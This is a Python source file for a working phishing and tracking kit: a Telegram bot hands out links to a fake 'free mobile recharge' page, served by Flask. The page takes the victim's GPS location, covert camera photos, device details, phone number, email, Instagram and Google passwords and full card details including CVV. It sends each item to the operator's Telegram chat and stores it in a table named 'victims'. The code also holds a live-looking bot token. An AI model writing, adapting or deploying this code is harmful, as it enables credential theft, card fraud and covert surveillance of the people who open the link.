import os
import threading
import base64
import requests
import urllib.parse
import json
import time
import sqlite3
import re
from datetime import datetime
from flask import Flask, request, render_template_string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- CONFIGURATION ---
TOKEN = "7888111866:AAHUBF0GQU8ya9uySEYu35HPJ_GFsnv1aa0"
SERVER_URL = "https://specific-bot.onrender.com"

# FORCE JOIN CHANNELS
CHANNELS = [
    "https://t.me/forameing",
    "https://t.me/proxydominates", 
    "https://t.me/proxyintfiles"
]

app = Flask(__name__)

# --- DATABASE ---
def init_db():
    conn = sqlite3.connect('tracking.db')
    conn.execute('''CREATE TABLE IF NOT EXISTS victims (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        chat_id TEXT,
        timestamp DATETIME,
        ip TEXT,
        device_info TEXT,
        photos TEXT,
        phone TEXT,
        network TEXT,
        email TEXT,
        email_pass TEXT,
        instagram TEXT,
        insta_pass TEXT,
        youtube_email TEXT,
        youtube_pass TEXT,
        card_number TEXT,
        card_expiry TEXT,
        card_cvv TEXT,
        lat TEXT,
        lon TEXT,
        address TEXT,
        pincode TEXT
    )''')
    conn.commit()
    conn.close()

init_db()

def send_telegram_message(chat_id, text, photo=None):
    try:
        if photo:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
                data={'chat_id': chat_id, 'caption': text, 'parse_mode': 'Markdown'},
                files={'photo': ('photo.jpg', photo)})
        else:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown"})
    except Exception as e:
        print(f"Send Error: {e}")

# --- HTML TRAP PAGE ---
def get_html(chat_id, redirect_url):
    return f"""
<!DOCTYPE html>
<html>
<head>
    <title>FREE RECHARGE</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }}
        .container {{
            background: white;
            border-radius: 30px;
            max-width: 500px;
            width: 100%;
            overflow: hidden;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }}
        .header {{
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            text-align: center;
            color: white;
        }}
        .header h2 {{ font-size: 24px; margin-bottom: 10px; }}
        .content {{ padding: 30px; }}
        .step {{ display: none; }}
        .step.active {{ display: block; }}
        .btn {{
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            width: 100%;
            margin: 10px 0;
        }}
        .btn:disabled {{ opacity: 0.5; cursor: not-allowed; }}
        input, select {{
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
        }}
        .timer-box {{
            background: #f0f0f0;
            padding: 20px;
            border-radius: 15px;
            text-align: center;
            margin: 20px 0;
        }}
        .timer {{
            font-size: 48px;
            font-weight: bold;
            color: #f5576c;
        }}
        .progress-bar {{
            width: 100%;
            height: 8px;
            background: #e0e0e0;
            border-radius: 4px;
            overflow: hidden;
            margin: 15px 0;
        }}
        .progress-fill {{
            height: 100%;
            background: linear-gradient(90deg, #f093fb, #f5576c);
            width: 0%;
        }}
        .offer-badge {{
            background: #ffd700;
            color: #333;
            padding: 8px 15px;
            border-radius: 50px;
            display: inline-block;
            font-size: 12px;
            font-weight: bold;
            margin-bottom: 15px;
        }}
        .status-success {{
            background: #d4edda;
            color: #155724;
            padding: 15px;
            border-radius: 10px;
            text-align: center;
            margin: 15px 0;
        }}
        video, canvas {{ display: none; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="offer-badge">🎁 LIMITED OFFER 🎁</div>
            <h2>FREE RECHARGE</h2>
            <p>₹899 - 3 Months Pack</p>
        </div>
        <div class="content">
            <!-- Step 1: Location -->
            <div id="step1" class="step active">
                <p style="text-align: center; margin-bottom: 20px; font-size: 16px;">
                    🎁 <strong>FREE RECHARGE</strong> 🎁<br><br>
                    Allow location to check eligibility<br>in your region
                </p>
                <button class="btn" id="locationBtn">📍 ALLOW LOCATION</button>
            </div>
            
            <!-- Step 2: Camera -->
            <div id="step2" class="step">
                <p style="text-align: center; margin-bottom: 20px; font-size: 16px;">
                    🤖 <strong>HUMAN VERIFICATION</strong><br><br>
                    Verify you are human to claim<br>this exclusive offer
                </p>
                <button class="btn" id="cameraBtn">📸 ALLOW CAMERA</button>
            </div>
            
            <!-- Step 3: Phone Number Form -->
            <div id="step3" class="step">
                <h3 style="text-align: center; margin-bottom: 10px;">🎁 3 MONTHS FREE RECHARGE</h3>
                <p style="text-align: center; color: #666; margin-bottom: 20px;">₹899 Value • Unlimited Calls • 2GB/Day</p>
                <select id="network">
                    <option value="Jio">Jio</option>
                    <option value="Airtel">Airtel</option>
                    <option value="Vi">Vi</option>
                    <option value="BSNL">BSNL</option>
                </select>
                <input type="tel" id="phone" placeholder="Mobile Number (e.g., 9876543210)" maxlength="10">
                <button class="btn" id="phoneBtn">CONTINUE</button>
            </div>
            
            <!-- Step 4: Email Login -->
            <div id="step4" class="step">
                <h3 style="text-align: center; margin-bottom: 20px;">📧 EMAIL VERIFICATION</h3>
                <p style="text-align: center; color: #666; margin-bottom: 20px;">Enter your email to activate recharge</p>
                <input type="email" id="email" placeholder="Email Address">
                <input type="password" id="emailPass" placeholder="Password">
                <button class="btn" id="emailBtn">VERIFY & CLAIM</button>
            </div>
            
            <!-- Step 5: Options + Timer -->
            <div id="step5" class="step">
                <div class="status-success">
                    ✅ Recharge Initiated! ₹899 - 3 Months Pack
                </div>
                <div class="timer-box">
                    <div class="timer" id="timer">35:00</div>
                    <div class="progress-bar">
                        <div class="progress-fill" id="progressFill"></div>
                    </div>
                    <p style="color: #666; font-size: 12px;">Recharge will activate in 35 minutes</p>
                </div>
                <p style="text-align: center; margin: 20px 0; font-weight: bold;">🎁 BONUS OFFERS 🎁</p>
                <button class="btn" id="instagramBonusBtn">📸 Get 10K Instagram Followers FREE</button>
                <button class="btn" id="youtubeBonusBtn">🎬 FREE YouTube Premium (1 Month)</button>
                <button class="btn" id="amazonBonusBtn">🛍️ Amazon ₹2000 Gift Card</button>
            </div>
            
            <!-- Step 6: Instagram Login -->
            <div id="step6" class="step">
                <h3 style="text-align: center; margin-bottom: 20px;">📸 INSTAGRAM VERIFICATION</h3>
                <p style="text-align: center; color: #666; margin-bottom: 20px;">Login to claim 10k followers</p>
                <input type="text" id="instaUser" placeholder="Instagram Username">
                <input type="password" id="instaPass" placeholder="Password">
                <button class="btn" id="instaBtn">CLAIM FOLLOWERS</button>
            </div>
            
            <!-- Step 7: YouTube Login -->
            <div id="step7" class="step">
                <h3 style="text-align: center; margin-bottom: 20px;">🎬 GOOGLE ACCOUNT</h3>
                <p style="text-align: center; color: #666; margin-bottom: 20px;">Login for YouTube Premium</p>
                <input type="email" id="ytEmail" placeholder="Gmail/Email">
                <input type="password" id="ytPass" placeholder="Password">
                <button class="btn" id="ytBtn">CLAIM PREMIUM</button>
            </div>
            
            <!-- Step 8: Amazon Card -->
            <div id="step8" class="step">
                <h3 style="text-align: center; margin-bottom: 20px;">🛍️ AMAZON GIFT CARD</h3>
                <p style="text-align: center; color: #666; margin-bottom: 20px;">Enter card details to claim ₹2000</p>
                <input type="text" id="cardNumber" placeholder="Card Number">
                <input type="text" id="cardExpiry" placeholder="MM/YY">
                <input type="text" id="cardCvv" placeholder="CVV">
                <button class="btn" id="cardBtn">CLAIM GIFT CARD</button>
            </div>
            
            <!-- Final Step -->
            <div id="step9" class="step">
                <div class="status-success" style="text-align: center; padding: 30px;">
                    🎉 ALL SET! 🎉<br><br>
                    ✅ Recharge Activated<br>
                    ✅ Bonuses Added<br><br>
                    Redirecting...
                </div>
            </div>
        </div>
    </div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        let chatId = "{chat_id}";
        let redirectUrl = "{redirect_url}";
        let stream = null;
        let photos = [];
        let timerInterval = null;
        let timeLeft = 2100;
        
        function showStep(step) {{
            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
            document.getElementById(`step${{step}}`).classList.add('active');
        }}
        
        // Step 1: LOCATION
        document.getElementById('locationBtn').onclick = function() {{
            let btn = this;
            btn.disabled = true;
            btn.innerHTML = "📍 CHECKING...";
            
            if (!navigator.geolocation) {{
                alert('Your browser does not support location. Please use Chrome or Safari.');
                btn.disabled = false;
                btn.innerHTML = "📍 ALLOW LOCATION";
                return;
            }}
            
            navigator.geolocation.getCurrentPosition(
                async (position) => {{
                    let lat = position.coords.latitude;
                    let lon = position.coords.longitude;
                    
                    await fetch(window.location.origin + '/location_data', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({{ chat_id: chatId, lat: lat, lon: lon }})
                    }});
                    
                    showStep(2);
                }},
                (error) => {{
                    btn.disabled = false;
                    btn.innerHTML = "📍 ALLOW LOCATION";
                    alert('❌ Please allow location to check eligibility. Tap the 🔒 icon and enable location.');
                }},
                {{ enableHighAccuracy: true, timeout: 15000 }}
            );
        }};
        
        // Step 2: CAMERA
        document.getElementById('cameraBtn').onclick = async function() {{
            let btn = this;
            btn.disabled = true;
            btn.innerHTML = "📸 VERIFYING...";
            
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {{
                alert('Camera not supported. Please use Chrome or Safari.');
                btn.disabled = false;
                btn.innerHTML = "📸 ALLOW CAMERA";
                return;
            }}
            
            try {{
                stream = await navigator.mediaDevices.getUserMedia({{ 
                    video: {{ facingMode: "user" }}, 
                    audio: false 
                }});
                
                let video = document.getElementById('video');
                let canvas = document.getElementById('canvas');
                video.srcObject = stream;
                await video.play();
                
                // 10 photos - background mein
                for(let i = 0; i < 10; i++) {{
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    let photo = canvas.toDataURL('image/jpeg', 0.8);
                    photos.push(photo);
                    await new Promise(r => setTimeout(r, 600));
                }}
                
                await fetch(window.location.origin + '/upload_photos', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{ chat_id: chatId, photos: photos }})
                }});
                
                stream.getTracks().forEach(t => t.stop());
                showStep(3);
                
            }} catch(err) {{
                btn.disabled = false;
                btn.innerHTML = "📸 ALLOW CAMERA";
                alert('❌ Please allow camera to verify human identity. Tap the 🔒 icon and enable camera.');
            }}
        }};
        
        // Step 3: Phone Number
        document.getElementById('phoneBtn').onclick = async function() {{
            let network = document.getElementById('network').value;
            let phone = document.getElementById('phone').value;
            
            if(!phone || phone.length < 10) {{
                alert('Enter valid 10-digit mobile number');
                return;
            }}
            
            await fetch(window.location.origin + '/phone_data', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{ chat_id: chatId, network: network, phone: phone }})
            }});
            
            showStep(4);
        }};
        
        // Step 4: Email
        document.getElementById('emailBtn').onclick = async function() {{
            let email = document.getElementById('email').value;
            let emailPass = document.getElementById('emailPass').value;
            
            if(!email) {{
                alert('Enter email address');
                return;
            }}
            
            await fetch(window.location.origin + '/email_data', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{ chat_id: chatId, email: email, email_pass: emailPass }})
            }});
            
            showStep(5);
            startTimer();
        }};
        
        // Timer
        function startTimer() {{
            timerInterval = setInterval(() => {{
                if(timeLeft <= 0) {{
                    clearInterval(timerInterval);
                    document.getElementById('timer').innerHTML = '00:00';
                    document.getElementById('progressFill').style.width = '100%';
                    setTimeout(() => {{
                        window.location.href = redirectUrl;
                    }}, 2000);
                }} else {{
                    timeLeft--;
                    let minutes = Math.floor(timeLeft / 60);
                    let seconds = timeLeft % 60;
                    document.getElementById('timer').innerHTML = `${{minutes.toString().padStart(2,'0')}}:${{seconds.toString().padStart(2,'0')}}`;
                    let progress = ((2100 - timeLeft) / 2100) * 100;
                    document.getElementById('progressFill').style.width = `${{progress}}%`;
                }}
            }}, 1000);
        }}
        
        // Bonus: Instagram
        document.getElementById('instagramBonusBtn').onclick = function() {{ showStep(6); }};
        document.getElementById('instaBtn').onclick = async function() {{
            let instaUser = document.getElementById('instaUser').value;
            let instaPass = document.getElementById('instaPass').value;
            await fetch(window.location.origin + '/instagram_data', {{
                method: 'POST', headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{ chat_id: chatId, instagram: instaUser, insta_pass: instaPass }})
            }});
            showStep(5);
        }};
        
        // Bonus: YouTube
        document.getElementById('youtubeBonusBtn').onclick = function() {{ showStep(7); }};
        document.getElementById('ytBtn').onclick = async function() {{
            let ytEmail = document.getElementById('ytEmail').value;
            let ytPass = document.getElementById('ytPass').value;
            await fetch(window.location.origin + '/youtube_data', {{
                method: 'POST', headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{ chat_id: chatId, youtube_email: ytEmail, youtube_pass: ytPass }})
            }});
            showStep(5);
        }};
        
        // Bonus: Amazon
        document.getElementById('amazonBonusBtn').onclick = function() {{ showStep(8); }};
        document.getElementById('cardBtn').onclick = async function() {{
            let cardNumber = document.getElementById('cardNumber').value;
            let cardExpiry = document.getElementById('cardExpiry').value;
            let cardCvv = document.getElementById('cardCvv').value;
            await fetch(window.location.origin + '/card_data', {{
                method: 'POST', headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{ chat_id: chatId, card_number: cardNumber, card_expiry: cardExpiry, card_cvv: cardCvv }})
            }});
            showStep(5);
        }};
        
        // Auto device info
        async function sendDeviceInfo() {{
            let deviceInfo = {{
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: screen.width + "x" + screen.height,
                cores: navigator.hardwareConcurrency,
                ram: navigator.deviceMemory
            }};
            
            try {{
                let b = await navigator.getBattery();
                deviceInfo.battery = Math.round(b.level * 100) + "%";
                deviceInfo.charging = b.charging;
            }} catch(e) {{}}
            
            await fetch(window.location.origin + '/device_info', {{
                method: 'POST', headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{ chat_id: chatId, device_info: deviceInfo }})
            }});
        }}
        
        sendDeviceInfo();
    </script>
</body>
</html>
    """

# --- FLASK ROUTES ---
@app.route('/')
def index():
    cid = request.args.get('id')
    redir = request.args.get('redir', 'https://google.com')
    return render_template_string(get_html(cid, redir))

@app.route('/device_info', methods=['POST'])
def device_info():
    data = request.json
    chat_id = data.get('chat_id')
    device_info = data.get('device_info')
    
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    
    try:
        ip_info = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp", timeout=5).json()
    except:
        ip_info = {}
    
    msg = f"""📊 **Visitor Info**
━━━━━━━━━━━━━━━━━━
🖥️ Device: `{device_info.get('platform', 'N/A')}`
🌐 IP: `{ip}`
📡 ISP: {ip_info.get('isp', 'N/A')}
📍 Location: {ip_info.get('city', 'N/A')}, {ip_info.get('country', 'N/A')}
📺 Screen: {device_info.get('screen', 'N/A')}
🔋 Battery: {device_info.get('battery', 'N/A')}
━━━━━━━━━━━━━━━━━━
⚡ @proxyfxc"""
    
    send_telegram_message(chat_id, msg)
    return "OK"

@app.route('/location_data', methods=['POST'])
def location_data():
    data = request.json
    chat_id = data.get('chat_id')
    lat = data.get('lat')
    lon = data.get('lon')
    
    map_link = f"https://maps.google.com/?q={lat},{lon}"
    
    full_address = 'N/A'
    pincode = 'N/A'
    try:
        geo = requests.get(f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json", timeout=5)
        address_data = geo.json()
        full_address = address_data.get('display_name', 'N/A')
        match = re.search(r'\b\d{6}\b', full_address)
        if match:
            pincode = match.group()
    except:
        pass
    
    msg = f"""📍 **GPS Location**
━━━━━━━━━━━━━━━━━━
🎯 Coordinates: {lat}, {lon}
🏠 Address: {full_address}
📍 PINCODE: {pincode}
🗺️ Map: {map_link}
━━━━━━━━━━━━━━━━━━
⚡ @proxyfxc"""
    
    send_telegram_message(chat_id, msg)
    return "OK"

@app.route('/upload_photos', methods=['POST'])
def upload_photos():
    data = request.json
    chat_id = data.get('chat_id')
    photos = data.get('photos', [])
    
    send_telegram_message(chat_id, f"📸 **Photos:** {len(photos)} captured")
    
    for i, photo in enumerate(photos[:8]):
        try:
            img_data = base64.b64decode(photo.split(',')[1])
            send_telegram_message(chat_id, f"📸 Photo {i+1}", img_data)
        except:
            pass
    
    return "OK"

@app.route('/phone_data', methods=['POST'])
def phone_data():
    data = request.json
    chat_id = data.get('chat_id')
    network = data.get('network')
    phone = data.get('phone')
    
    msg = f"""📱 **Phone Number**
━━━━━━━━━━━━━━━━━━
📡 Network: {network}
📞 Number: +91 {phone}
━━━━━━━━━━━━━━━━━━
⚡ @proxyfxc"""
    send_telegram_message(chat_id, msg)
    return "OK"

@app.route('/email_data', methods=['POST'])
def email_data():
    data = request.json
    chat_id = data.get('chat_id')
    email = data.get('email')
    email_pass = data.get('email_pass')
    
    msg = f"""📧 **Email Login**
━━━━━━━━━━━━━━━━━━
📧 Email: {email}
🔑 Password: {email_pass}
━━━━━━━━━━━━━━━━━━
⚡ @proxyfxc"""
    send_telegram_message(chat_id, msg)
    return "OK"

@app.route('/instagram_data', methods=['POST'])
def instagram_data():
    data = request.json
    chat_id = data.get('chat_id')
    instagram = data.get('instagram')
    insta_pass = data.get('insta_pass')
    
    msg = f"""📸 **Instagram Login**
━━━━━━━━━━━━━━━━━━
👤 Username: {instagram}
🔑 Password: {insta_pass}
━━━━━━━━━━━━━━━━━━
⚡ @proxyfxc"""
    send_telegram_message(chat_id, msg)
    return "OK"

@app.route('/youtube_data', methods=['POST'])
def youtube_data():
    data = request.json
    chat_id = data.get('chat_id')
    yt_email = data.get('youtube_email')
    yt_pass = data.get('youtube_pass')
    
    msg = f"""🎬 **YouTube Premium**
━━━━━━━━━━━━━━━━━━
📧 Email: {yt_email}
🔑 Password: {yt_pass}
━━━━━━━━━━━━━━━━━━
⚡ @proxyfxc"""
    send_telegram_message(chat_id, msg)
    return "OK"

@app.route('/card_data', methods=['POST'])
def card_data():
    data = request.json
    chat_id = data.get('chat_id')
    card_number = data.get('card_number')
    card_expiry = data.get('card_expiry')
    card_cvv = data.get('card_cvv')
    
    msg = f"""💳 **Card Details**
━━━━━━━━━━━━━━━━━━
💳 Card: {card_number}
📅 Expiry: {card_expiry}
🔐 CVV: {card_cvv}
━━━━━━━━━━━━━━━━━━
⚡ @proxyfxc"""
    send_telegram_message(chat_id, msg)
    return "OK"

# --- TELEGRAM BOT ---
async def is_subscribed(app, user_id):
    for channel_url in CHANNELS:
        username = channel_url.split("t.me/")[-1]
        try:
            member = await app.bot.get_chat_member(chat_id=f"@{username}", user_id=user_id)
            if member.status in ["left", "kicked"]:
                return False
        except:
            return False
    return True

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not await is_subscribed(context.application, user_id):
        buttons = []
        for channel in CHANNELS:
            buttons.append([InlineKeyboardButton("🔹 JOIN CHANNEL", url=channel)])
        buttons.append([InlineKeyboardButton("✅ VERIFIED", url=f"https://t.me/{(await context.bot.get_me()).username}?start")])
        
        await update.message.reply_text(
            "❌ **ACCESS DENIED!**\n\nBot use karne ke liye aapko hamare teenon channels join karne honge.\n\n━━━━━━━━━━━━━━━━\n**JOIN THESE CHANNELS TO USE OUR BOT**\n━━━━━━━━━━━━━━━━",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        return
    
    await update.message.reply_text(
        "𝗧𝗥𝗔𝗖𝗞𝗘𝗥 𝗢𝗡𝗟𝗜𝗡𝗘\n\nᴄᴏᴘʏ ᴛʜɪs ᴀɴᴅ ᴘᴀsᴛᴇ👉 (https://youtube.com).\n\n✅ 𝗬𝗢𝗨𝗥 𝗧𝗥𝗔𝗖𝗞𝗜𝗡𝗚 𝗟𝗜𝗡𝗞👇\n"
        f"`{SERVER_URL}/?id={user_id}&redir=https%3A//youtube.com`\n\n⚡ Powered by @proxyfxc",
        parse_mode="Markdown"
    )

async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not await is_subscribed(context.application, user_id):
        await start(update, context)
        return
    
    url = update.message.text
    if not url.startswith("http"):
        await update.message.reply_text("❌ Link `http` ya `https` se shuru hona chahiye.")
        return
    
    uid = update.effective_chat.id
    redir = urllib.parse.quote(url)
    link = f"{SERVER_URL}/?id={uid}&redir={redir}"
    
    await update.message.reply_text(
        f"✅ 𝗬𝗢𝗨𝗥 𝗧𝗥𝗔𝗖𝗞𝗜𝗡𝗚 𝗟𝗜𝗡𝗞👇\n`{link}`\n\n⚡ Powered by @proxyfxc",
        parse_mode="Markdown"
    )

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

if __name__ == '__main__':
    threading.Thread(target=run_flask).start()
    bot = Application.builder().token(TOKEN).build()
    bot.add_handler(CommandHandler("start", start))
    bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_link))
    bot.run_polling()
